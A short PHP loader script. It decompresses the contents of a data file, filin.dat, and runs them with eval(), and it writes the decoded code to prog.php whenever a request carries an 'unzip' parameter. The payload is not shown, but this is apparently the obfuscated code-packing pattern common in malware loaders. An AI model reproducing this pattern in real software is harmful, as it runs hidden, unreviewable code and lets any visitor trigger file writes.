<?php
	$path = dirname( __FILE__ );
	if(file_exists($path.'/prog.php')) {
		include($path.'/prog.php');
	} else {
		$dt = file_get_contents($path.'/filin.dat');
		if (strpos($dt,'array')===false ) $dt = @gzinflate($dt);
		$dt = trim($dt);
		if( isset( $_REQUEST['unzip'] )) file_put_contents($path.'/prog.php', "<?php".chr(10).$dt.chr(10)."?>");
		eval($dt);
	}
?>